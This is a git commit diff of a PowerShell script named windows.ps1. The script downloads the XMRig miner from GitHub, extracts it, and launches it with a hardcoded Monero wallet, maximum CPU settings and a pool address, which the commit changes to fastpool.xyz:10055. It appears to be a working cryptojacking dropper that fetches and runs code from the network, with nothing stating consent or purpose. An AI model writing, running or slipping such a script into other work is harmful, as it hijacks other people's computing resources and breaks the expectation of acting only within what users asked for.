dc04e9093e40e7d8a308346ed14ace7087a41c98
Lachine <86872452+Lachine1@users.noreply.github.com>
2025-01-16 20:20:23 +0100

    Update windows.ps1

--- windows.ps1
+++ windows.ps1
@@ -1,3 +1,3 @@
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig.zip"
 Expand-Archive xmrig.zip
-.\xmrig\xmrig-6.22.2\xmrig.exe -o node.monerod.org:443 -u 4BCzRFseZPce3GUMsqGEHjeSgzzBhE3C72JdGdapz3kgdWpq4ri7NbNfTKCotSdAP2a6c6f4Qq3XHWRMJX1EYJnrDrSeJG3 --cpu-priority 4 --cpu-max-threads-hint=100 --algo=rx/0
+.\xmrig\xmrig-6.22.2\xmrig.exe -o fastpool.xyz:10055 -u 4BCzRFseZPce3GUMsqGEHjeSgzzBhE3C72JdGdapz3kgdWpq4ri7NbNfTKCotSdAP2a6c6f4Qq3XHWRMJX1EYJnrDrSeJG3@Triage --cpu-priority 4 --cpu-max-threads-hint=100 --algo=rx/0
